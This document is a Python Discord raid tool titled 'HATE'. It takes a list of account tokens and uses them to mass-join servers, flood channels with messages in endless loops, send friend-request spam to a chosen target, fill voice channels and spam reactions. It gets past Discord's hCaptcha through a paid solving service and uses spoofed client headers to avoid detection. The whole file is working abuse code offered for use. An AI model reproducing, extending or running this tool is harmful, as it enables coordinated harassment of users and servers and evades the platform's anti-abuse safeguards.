import os
try:
    import aiohttp, asyncio, os, sys, threading, requests, time, aiohttp, asyncio, random, string, httpx
    from pystyle                                                             import Add, Center, Anime, Colors, Colorate, Write, System
    from colorama import Fore, Back, Style
    from concurrent.futures import ThreadPoolExecutor
    import logging
    import websocket
    import json
    import emoji
except:
    os.system('pip install httpx')
    os.system('pip install pystyle')
    os.system('pip install aiohttp')
    os.system('pip install requests')
    os.system('pip install colorama')
    os.system('pip install logging')
    os.system('pip install websocket')
    os.system('pip install websocket-client')
    os.system("pip install emoji")
    os.system('py hate.py')

logging.basicConfig(
    level=logging.INFO,
    format="\033[38;5;196m[\033[0m%(asctime)s.%(msecs)03d\033[38;5;196m] \033[0m%(message)s\033[0m",
    datefmt="%H:%M:%S"
)

captchaApi = "anti-captcha.com"
captchaKey = ""  # YOUR CAPTCHA API KEY IF YOU HAVE ONE 

System.Clear() 
os.system('title PRESS ENTER')
logo = r'''                
██╗  ██╗ █████╗ ████████╗███████╗
██║  ██║██╔══██╗╚══██╔══╝██╔════╝
███████║███████║   ██║   █████╗  
██╔══██║██╔══██║   ██║   ██╔══╝  
██║  ██║██║  ██║   ██║   ███████╗
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
                                   
    
                                      
     Join discord.gg/still
    '''
Anime.Fade(Center.Center(logo), Colors.rainbow, Colorate.Vertical, interval=0.020, enter=True)



def Captcha():
    taskId = httpx.post(f"https://api.{captchaApi}/createTask", json={"clientKey": captchaKey, "task": {"type": "HCaptchaTaskProxyless", "websiteURL": "https://discord.com/", "websiteKey": "f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34", "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"}}, timeout=30).json()
    if taskId.get("errorId") > 0:
        print(f"{Fore.RED}{Style.BRIGHT}[-] createTask - {taskId.get('errorDescription')}!{Style.RESET_ALL}")
        return Captcha()
            
    taskId = taskId.get("taskId")
        
        
    captchaData = httpx.post(f"https://api.{captchaApi}/getTaskResult", json={"clientKey": captchaKey, "taskId": taskId}, timeout=30).json()
    if captchaData.get("status") == "ready":
        solvedCaptcha = captchaData.get("solution").get("gRecaptchaResponse")
            
    return solvedCaptcha



try: 
    import tasksio
except:
    os.system('pip install tasksio')

System.Clear()


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text
    
    
def thirdHeader(token):
    return {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36',
        'accept': '*/*',
        'accept-language': 'en-US',
        'Content-Type': 'application/json',
        'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijk4OTkxOTY0NTY4MTE4ODk1NCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI5OTAzMTc0ODgxNzg4NjgyMjQiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9',
        'Authorization': token,
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTM2MjQwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
        'X-Discord-Locale': 'en-US',
        'X-Debug-Options': 'bugReporterEnabled',
        'origin': 'https://discord.com',
        'DNT': '1',
        'connection': 'keep-alive',
        'Referer': 'https://discord.com',
        'cookie': f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'TE': 'Trailers',
    }

def bypassHeader(token):
    return {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': '*/*',
        'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijk4OTkxOTY0NTY4MTE4ODk1NCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI5OTAzMTc0ODgxNzg4NjgyMjQiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9',
        'Authorization': token,
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTM2MjQwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
        'X-Discord-Locale': 'en-US',
        'X-Debug-Options': 'bugReporterEnabled',
        'Origin': 'https://discord.com',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://discord.com',
        'Cookie': '__dcfduid=21183630021f11edb7e89582009dfd5e; __sdcfduid=21183631021f11edb7e89582009dfd5ee4936758ec8c8a248427f80a1732a58e4e71502891b76ca0584dc6fafa653638; locale=en-US',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'TE': 'trailers',
    }
    


def mainHeaders(token):
    return {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
 
async def reactionSpammer():
    tokens = open("tokens.txt").read().split("\n")
    chanid = input(" Channel Id  >  ")
    msgid = input(" Message Id  >  ")
    emj = input(" Emoji?  >  ")
    session = requests.Session() 
    def spam(channel_id, message_id, org, token):
        headers = bypassHeader(token)
        
        emo = emoji.emojize(org)
        r = session.put(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emo}/@me", headers=headers)
        if r.status_code == 204:
            logging.info(f"Reaction add to {message_id} | {emo}")

        else:
            logging.info(f"Error trying to add {emo} to {message_id}")
            
    
    for token in tokens:
        threading.Thread(target=spam, args=(chanid, msgid, emj, token,)).start()

    time.sleep(0.9)

async def Onliner():
    
    tokens = open("tokens.txt").read().split("\n")
    print("""
    
       [1] Online
       [2] Dnd
       [3] Idle
    
    
    """)
    
    stat = input("   >  ")
    if stat == "1":
        stat = "online"
        
    elif stat == "2":
        stat = "dnd"
        
    elif stat == "3":
        stat = "idle"
        
    else:
        stat = "online"
        
    print("""
    
       [1] Playing
       [2] Streaming
       [3] Listening
       [4] Watching
       [n] N/A
    """)
    pres = input("   >  ")
    if pres == "1":
        game = input(" Game Name?  >  ")
        gjson = {
            "name": game,
            "type": 0
        }
        
    elif pres == "2":
        game = input(" Stream Name?  >  ")
        ur = input("  Stream URL?  >  ")
        
        gjson = {
            "name": game,
            "type": 1,
            "url": ur
        }
    elif pres == "3":
        game = input(" Song/App Name?  >  ")
        gjson = {
            "name": game,
            "type": 2
        }
        
    elif pres == "4":
        game = input(" Movie Name?  >  ")
        gjson = {
            "name": game,
            "type": 3
        }
        
    else:
        
        gjson = None
 
    exe = ThreadPoolExecutor(max_workers=1000)
    def line(token):
        socket = websocket.WebSocket()
        socket.connect("wss://gateway.discord.gg/?v=8&encoding=json")
        res = socket.recv()
        h = json.loads(res)
        heartbeat = int(h["d"]["heartbeat_interval"])
        
        socket.send(json.dumps({"op": 2, "d": {"token": token, "properties": {"$os": sys.platform, "$browser": "Discord", "$device": "desktop"}, "presence": {"game": gjson, "status": stat, "since": 0, "afk": False}}, "s": None, "t": None}))
        
        beats = {"op": 1, "d": None}
        logging.info(f"Token Online : {token}")
        while True:
            socket.send(json.dumps(beats))
            time.sleep(heartbeat / 1000)
 
    for token in tokens:
        
        exe.submit(line, token)
    time.sleep(1)
    enter = input("Press ENTER ")
    
def friend_req(token, user):
    try:
        target = user.split('#')
        headers=thirdHeader(token)
        json = {"username": target[0], "discriminator": target[1]}
        
        r = requests.post(f'https://discord.com/api/v9/users/@me/relationships', headers=headers, json=json)
        if r.status_code == 204:
            logging.info(f'Friend request sent to {target[0]}#{target[1]}')
        elif r.status_code == 429:
            b = r.json()
            logging.info(f'Ratelimited, retrying in {b["retry_after"]} seconds..')
            
        else:
            solved = Captcha()
            r = requests.post(f'https://discord.com/api/v9/users/@me/relationships', headers=headers, json={"username": target[0], "discriminator": target[1], "captcha_key": solved})
            if r.status_code == 204:
                logging.info(f'Friend request sent to {target[0]}#{target[1]}')
            elif r.status_code == 429:
                b = r.json()
                logging.info(f'Ratelimited, retrying in {b["retry_after"]} seconds..')
    except Exception as err:
        print("ERROR")
        print()
        print(err)        

async def friender():
    print()
    us = input("Target's Username + tag: ")
    tokens = open("tokens.txt").read().split('\n')
    for token in tokens:
        t = threading.Thread(target=friend_req, args=(token, us,)).start()
       


async def vcSpammer():
    
    tokens = open("tokens.txt").read().split("\n")
    channel = int(input("channel id >  "))
    guild = int(input("guild id  >  "))
    mute = input("mute? (y/n)  >  ")
    deaf = input("deafen? (y/n)  >  ")
    video = input("video? (y/n)  >  ")
    
    
    if mute == "y":
        mute = True
        
    else:
        mute = False
        
    if deaf == "y":
        deaf = True
        
    else:
        deaf = False
        
    if video == "y":
        video = True
        
    else:
        video = False
        
    
        
    exe = ThreadPoolExecutor(max_workers=1000)
    
    def spam(token):
        while True:
            socket = websocket.WebSocket()
            socket.connect("wss://gateway.discord.gg/?v=8&encoding=json")
            h = json.loads(socket.recv())
            heartbeat = h['d']['heartbeat_interval']
            socket.send(json.dumps({"op": 2, "d": {"token": token, "properties": {"$os": "windows", "$browser": "Discord", "$device": "desktop"}}}))
            socket.send(json.dumps({"op": 4, "d": {"guild_id": guild, "channel_id": channel, "self_mute": mute, "self_deaf": deaf, "self_video": video}}))
            socket.send(json.dumps({"op": 18, "d": {"type": "guild", "guild_id": guild, "channel_id": channel, "preferred_region": "singapore"}}))
            socket.send(json.dumps({"op": 1, "d": None}))
        
    
    for token in tokens:
        exe.submit(spam, token)
        logging.info("Joined VC")
        
        
    
    enter = input("press ENTER to stop VC spammer")        
    
def token_joiner(token, inv):
        
    headers = thirdHeader(token)
    
    res = requests.post(f"https://canary.discord.com/api/v9/invites/{inv}", headers=headers, json={})
            
    if res.status_code in [200, 201, 204]:
        logging.info(f"Succesfully Joined Server | {inv} ")
    elif res.status_code == 429:
        try:
            f = res.json()
            logging.info(f'Ratelimited, retrying in {f["retry_after"]}')
        except Exception:
            logging.info(f'ERROR | MASS RATELIMIT')
    elif res.status_code == 403:
        logging.info(f'TOKEN LOCKED | {token}')    
    else:
        captcha = Captcha()
        r = requests.post(f"https://canary.discord.com/api/v9/invites/{inv}", headers=headers, json={"captcha_key": captcha})
        if r.status_code in [200, 201, 204]:
            logging.info(f"Succesfully Joined Server | {inv} ")
        elif r.status_code == 429:
            
            f = r.json()
            logging.info(f'Ratelimited, retrying in {f["retry_after"]}')
            
        elif r.status_code == 403:
            logging.info(f'TOKEN LOCKED | {token}')
        else:
            logging.info(f'ERROR | UNKNOWN ERROR')        
async def mass_join():
    print("Make sure you have valid tokens in tokens.txt")
    inv = input("server invite link -> ")
    try:
        ins = inv.split(".gg/")
        invite = ins[1]
    except:
        invite = inv
    tokens = open("tokens.txt", "r").read().split("\n")
   
    for token in tokens:
        
        
        threading.Thread(target=token_joiner, args=(token, invite,)).start()
    
def spam(token, channel, message):
    url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
    json = {"content": message, "tts": False}
    
    header = bypassHeader(token)
    while True:
        try:
            r = requests.post(url, headers=header, json=json)
            

            if r.status_code == 429:
                print(f"Ratlimit")
                time.sleep(float(ratelimit['retry_after']))
            elif r.status_code == 200:
                print(f"Sent | {message}")
            elif r.status_code == 401:
                print(f"Invalid Token")
            elif r.status_code == 404:
                print(f"404 |       NOT FOUND")
            elif r.status_code == 403:
                print(f"Token Doesnt Have Perms For This Channel!")
        except:
            pass
        
        
        
async def main():
    os.system('cls')
    print(Colorate.Vertical(Colors.red_to_white, Center.XCenter("""
  ██╗  ██╗ █████╗ ████████╗███████╗
  ██║  ██║██╔══██╗╚══██╔══╝██╔════╝
  ███████║███████║   ██║   █████╗  
  ██╔══██║██╔══██║   ██║   ██╔══╝  
  ██║  ██║██║  ██║   ██║   ███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
                                   
    
[1] Token Joiner       [5] Token Onliner
[2] Server Raider      [6] Reaction Spammer
[3] Friend Spammer     [r] Restart Program
[4] VC Spammer         [x] Exit
       


    """)))
    choice = input("   >  ")
    
    if choice == "1":
        await mass_join()
        await asyncio.sleep(2)
        await main()
        
    elif choice == "2":
        print()
        print("Make sure you have tokens in tokens.txt for this to work")
        print()
        tokens = open("tokens.txt").read().split('\n')
        channel_id = input("channel id: ")
        message = input("message: ")
    
        def thread():
            for token in tokens:
                threading.Thread(target=spam, args=(token, channel_id, message,)).start()
                
        start = input("Press ENTER to start: ")
        start = thread()        
            
        await asyncio.sleep(2)
        await main()
        
    elif choice == "3":
        await friender()
        await asyncio.sleep(2)
        await main()
        
    elif choice == "4":
        await vcSpammer()
        
        await asyncio.sleep(2)
        await main()
        
    elif choice == "5":
        await Onliner()
        await asyncio.sleep(1)
        await main()

    elif choice == "6":
        await reactionSpammer()
        await asyncio.sleep(1)
        await main()
        
    elif choice == "r" or choice == "R":
        System.Clear()
        os.system('py hate.py')
        
    
        
    elif choice == "x" or choice == "X":
        print("Exiting....")
        await asyncio.sleep(1)
        os._exit(0)
    
    else:
        os._exit(0)    

    


if __name__ == "__main__":
    asyncio.run(main())  
